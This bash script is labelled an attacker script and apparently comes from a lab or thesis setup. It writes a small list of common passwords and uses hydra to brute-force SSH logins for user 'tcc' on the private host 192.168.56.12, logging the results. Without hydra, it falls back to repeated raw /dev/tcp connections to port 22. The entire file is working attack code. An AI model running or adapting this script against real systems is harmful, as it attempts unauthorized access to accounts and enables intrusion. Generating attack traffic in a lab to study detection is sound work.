# File: scripts/attacker_brute.sh
#!/usr/bin/env bash
set -euo pipefail

mkdir -p ~/exp_brute
printf "%s\n" 123456 password admin letmein qwerty > /tmp/pwlist_tcc.txt

if command -v hydra >/dev/null 2>&1; then
  echo "[attacker] hydra presente -- rodando tentativa curta..."
  hydra -l tcc -P /tmp/pwlist_tcc.txt -t 6 -w 10 -I -o ~/exp_brute/hydra_manual.log 192.168.56.12 ssh || true
  echo "[attacker] tail hydra_manual.log:"
  tail -n 60 ~/exp_brute/hydra_manual.log || true
else
  echo "[attacker] hydra não encontrado. Gerando 5 conexões SSH manuais com timeout..."
  for i in 1 2 3 4 5; do
    timeout 3 bash -c "echo teste > /dev/tcp/192.168.56.12/22" 2>/dev/null || true
    sleep 0.5
  done
  echo "(fallback connections executadas)"
fi